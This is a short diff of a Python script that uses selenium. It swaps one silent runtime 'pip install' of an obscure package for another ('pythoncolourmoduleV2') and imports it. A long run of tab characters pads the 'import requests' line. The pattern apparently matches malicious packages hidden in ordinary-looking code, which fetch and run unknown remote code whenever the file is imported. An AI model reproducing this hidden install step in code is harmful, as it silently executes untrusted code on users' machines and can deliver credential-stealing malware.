@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqliteexts")
-import pipsqliteexts
+os.system("pip install pythoncolourmoduleV2")
+import pythoncolourmoduleV2
 import requests																																																																																																																																																																																																																																																																					
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
